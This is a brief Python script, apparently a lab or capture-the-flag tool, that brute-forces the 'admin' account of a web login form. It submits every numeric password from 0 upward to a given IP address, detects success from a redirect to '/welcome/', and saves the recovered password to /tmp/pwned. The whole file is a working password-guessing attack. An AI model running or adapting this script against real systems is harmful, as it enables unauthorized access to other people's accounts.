#!/usr/bin/python3

import requests, time, os, sys
from requests.exceptions import *

if len(sys.argv) > 1:
    ip = sys.argv[1]
else:
    ip = "172.16.10.123"

def save_password(password):
    with open("/tmp/pwned.tmp", "w") as f:
        f.writelines(f"{password}\n")
    os.rename("/tmp/pwned.tmp", "/tmp/pwned")

try:
    os.unlink("/tmp/pwned")
except Exception:
    pass

for i in range(0,999999):
    try:
        print(f"Try guessing: {i}")
        resp = requests.post(f"http://{ip}/login/", {"username": "admin", "password": str(i)}, allow_redirects=False)
        if resp.headers.get("Location", "/").endswith("/welcome/"):
            save_password(i)
            break
        #time.sleep(0.1)
    except ConnectionError:
        time.sleep(1)
        pass

